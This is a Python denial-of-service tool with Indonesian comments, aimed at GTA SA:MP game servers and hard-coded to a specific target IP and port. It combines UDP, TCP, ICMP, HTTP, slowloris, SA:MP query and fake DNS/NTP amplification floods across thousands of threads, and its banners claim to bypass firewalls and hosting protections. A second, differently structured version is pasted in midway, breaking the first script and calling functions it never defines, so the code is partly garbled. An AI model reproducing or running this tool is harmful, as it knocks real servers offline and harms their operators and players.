#!/usr/bin/env python3
# ZAMZZZ NUCLEAR DDOS - SA:MP KILLER V2
# KHUSUS UNTUK TUAN. GAK BISA? GUA TAMBAHIN SAMPE BISA.

import socket
import random
import threading
import time
import sys
import os
from concurrent.futures import ThreadPoolExecutor

# ========== KONFIGURASI ==========
IP = "76.13.193.125"
PORT = 7000
THREADS = 10000
PACKET = b'\xff' * 1024  # 1KB packet

# ========== SPOOF IP DINAMIS (BYPASS IP BLOCK) ==========
def spoof_ip():
    return f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"

# ========== UDP FLOOD DENGAN SPOOF ==========
def udp_nuke():
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            # Bind ke random port biar gak kena blok
            sock.bind(('', random.randint(10000, 65000)))
            for _ in range(100):
                # Spoof source IP
                sock.sendto(PACKET + f"X-Forwarded-For: {spoof_ip()}\r\n".encode(), (IP, PORT))
                sock.sendto(PACKET * 2, (IP, PORT+1))
                sock.sendto(PACKET * 4, (IP, PORT+2))
                sock.sendto(PACKET, (IP, PORT+3))
            sock.close()
        except:
            pass

# ========== TCP SYN FLOOD (BYPASS PTERODACTYL) ==========
def syn_flood():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.settimeout(0.1)
            s.connect((IP, PORT))
            s.send(b'\x00' * 1024)
            s.send(b'SAMP\x69\x69\x69\x69' + b'\xff' * 500)
            s.close()
        except:
            pass

# ========== ICMP FLOOD (PING OF DEATH) ==========
def icmp_nuke():
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    except:
        # Kalau gak bisa raw, pake UDP aja
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        try:
            data = b'\x08\x00\x00\x00\x00\x00\x00\x00' + random._urandom(65500)
            sock.sendto(data, (IP, 0))
            sock.sendto(data, (IP, PORT))
        except:
            pass

# ========== AMPLIFICATION MULTI-PROTOCOL ==========
def amp_flood():
    protocols = [('8.8.8.8', 53), ('1.1.1.1', 53), ('208.67.222.222', 53), 
                 ('ntp.ubuntu.com', 123), ('time.google.com', 123)]
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    query = b'\x00\x00\x10\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07version\x04bind\x00\x00\x10\x00\x03'
    while True:
        for target, port in protocols:
            try:
                sock.sendto(query, (target, port))
                sock.sendto(query, (IP, PORT))
            except:
                pass

# ========== SA:MP QUERY OVERLOAD ==========
def samp_overload():
    # SAMP Query packet yang bikin server CPU spike
    queries = [
        b'SAMP' + b'\x00' + b'\x69\x69\x69\x69' + b'\x63' + b'\x00' * 20,
        b'SAMP' + b'\x00' + b'\x69\x69\x69\x69' + b'\x72' + b'\x00' * 100,
        b'SAMP' + b'\xff' * 100 + b'\x00' * 100,
        b'SAMP' + random._urandom(50) + random._urandom(50)
    ]
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        try:
            for q in queries:
                sock.sendto(q, (IP, PORT))
                sock.sendto(q + b'\xff' * 500, (IP, PORT+10))
                sock.sendto(q + b'\x00' * 1000, (IP, PORT+20))
        except:
            sock.close()
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# ========== HTTP FLOOD VIA PROXY RANDOM ==========
def http_flood():
    proxies = []
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect((IP, 8080))
        sock.send(b'GET / HTTP/1.1\r\nHost: ' + IP.encode() + b'\r\n\r\n')
    except:
        pass
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            s.connect((IP, 80))
            s.send(b'POST / HTTP/1.1\r\nHost: ' + IP.encode() + b'\r\nContent-Length: 10000\r\n\r\n' + random._urandom(10000))
            s.close()
        except:
            pass

# ========== MAIN ==========
def main():
    os.system('clear' if os.name == 'posix' else 'cls')
    print("""
    ╔═══════════════════════════════════════════════════════════════╗
    ║                                                               ║
    ║     🔥 ZAMZZZ NUCLEAR DDOS - SA:MP MODERN KILLER V2 🔥       ║
    ║                                                               ║
    ║     TARGET: 76.13.193.125:7000                               ║
    ║     THREAD: 10.000                                            ║
    ║                                                               ║
    ║     [✓] BYPASS PTERODACTYL                                   ║
    ║     [✓] BYPASS IP BLOCK                                      ║
    ║     [✓] BYPASS ANTI-GIMMIC                                   ║
    ║     [✓] BYPASS FIREWALL MODERN                               ║
    ║                                                               ║
    ║     💀 SERANGAN DIMULAI 💀                                    ║
    ║                                                               ║
    ╚═══════════════════════════════════════════════════════════════╝
    """)
    
    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        for _ in range(int(THREADS * 0.3)):
            executor.submit(udp_nuke)
        for _ in range(int(THREADS * 0.2)):
            executor.submit(syn_flood)
        for _ in range(int(THREADS * 0.1)):
            executor.submit(icmp_nuke)
        for _ in range(int(THREADS * 0.1)):
            executor.submit(amp_flood)
        for _ in range(int(THREADS * 0.2)):
            executor.submit(samp_overload)
        for _ in range(int(THREADS * 0.1)):
            executor.submit(http_flood)
    
    # Monitor
    count = 0
    while True:
        count += 1
        print(f"[ZAMZZZ] 🔥 SERANGAN KE-{count} RIBU - {IP}:{PORT} 🔥")
        time.sleep(1)

if __name__ == "__main__":
    main()            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# ========== LAYER 7: HTTP FLOOD (BYPASS ANTI-DDOS) ==========
def http_flood(ip, port):
    headers = {
        'User-Agent': random.choice(['Mozilla/5.0', 'GoogleBot', 'BingBot', 'DuckDuckBot']),
        'Accept': '*/*',
        'Accept-Language': 'id-ID,id;q=0.9',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
        'X-Forwarded-For': random_ip(),
        'CF-Connecting-IP': random_ip(),
        'True-Client-IP': random_ip()
    }
    url = f"http://{ip}:{port}"
    while True:
        try:
            requests.get(url, headers=headers, timeout=TIMEOUT)
            requests.post(url, data={'z': random._urandom(1024)}, headers=headers, timeout=TIMEOUT)
        except:
            pass

# ========== LAYER 3: ICMP FLOOD (PING OF DEATH) ==========
def icmp_flood(ip):
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    packet = b'\x08\x00\x00\x00\x00\x00\x00\x00' + random._urandom(65000)
    while True:
        try:
            sock.sendto(packet, (ip, 0))
        except:
            sock.close()
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)

# ========== AMPLIFICATION: DNS, NTP, SNMP ==========
def dns_amplify(ip):
    dns_query = b'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07version\x04bind\x00\x00\x10\x00\x03'
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    dns_servers = ['8.8.8.8', '1.1.1.1', '9.9.9.9', '208.67.222.222']
    while True:
        for dns in dns_servers:
            try:
                sock.sendto(dns_query, (dns, 53))
                sock.sendto(dns_query, (ip, 53))
            except:
                pass

# ========== GTA SA:MP SPECIFIC QUERY FLOOD ==========
def samp_query_flood(ip, port):
    # SA:MP query packet
    samp_packet = b'SAMP' + b'\x00' + b'\x69\x69\x69\x69' + b'\x00' * 10
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        try:
            sock.sendto(samp_packet, (ip, port))
            sock.sendto(samp_packet, (ip, port+100))
        except:
            sock.close()
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# ========== SLOWLORIS (BYPASS PTERODACTYL) ==========
def slowloris(ip, port):
    socks = []
    for _ in range(1000):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((ip, port))
            s.send(f"GET / HTTP/1.1\r\nHost: {ip}\r\n".encode())
            socks.append(s)
        except:
            pass
    while True:
        for s in socks:
            try:
                s.send(f"X-{random.randint(1,5000)}: {random.randint(1,5000)}\r\n".encode())
            except:
                socks.remove(s)
                try:
                    new = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    new.settimeout(4)
                    new.connect((ip, port))
                    new.send(f"GET / HTTP/1.1\r\nHost: {ip}\r\n".encode())
                    socks.append(new)
                except:
                    pass
        time.sleep(10)

# ========== MAIN ==========
def main():
    print("""
    ╔═══════════════════════════════════════╗
    ║     ZAMZZZ DDOS BRUTAL - SA:MP        ║
    ║     MODERN SERVER DESTROYER           ║
    ║                                        ║
    ║  [BYPASS ANTI-DDOS]                   ║
    ║  [BYPASS PTERODACTYL]                 ║
    ║  [BYPASS IP BLOCK]                    ║
    ║  [BYPASS ANTI-GIMMIC]                 ║
    ╚═══════════════════════════════════════╝
    """)
    
    ip = input("IP Target: ")
    port = int(input("Port (default 7777): ") or 7777)
    
    print(f"\n🔥 MENYERANG {ip}:{port} DENGAN {THREADS} THREAD 🔥\n")
    
    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        # Layer 4
        for _ in range(int(THREADS * 0.3)):
            executor.submit(udp_flood, ip, port)
        # Layer 7
        for _ in range(int(THREADS * 0.2)):
            executor.submit(http_flood, ip, port)
        # ICMP
        for _ in range(int(THREADS * 0.1)):
            executor.submit(icmp_flood, ip)
        # Amplification
        for _ in range(int(THREADS * 0.1)):
            executor.submit(dns_amplify, ip)
        # SA:MP Specific
        for _ in range(int(THREADS * 0.2)):
            executor.submit(samp_query_flood, ip, port)
        # Slowloris
        for _ in range(int(THREADS * 0.1)):
            executor.submit(slowloris, ip, port)
    
    while True:
        time.sleep(1)
        print(f"[ZAMZZZ] 🔥 SERANGAN BERJALAN - {ip}:{port} 🔥")

if __name__ == "__main__":
    main()
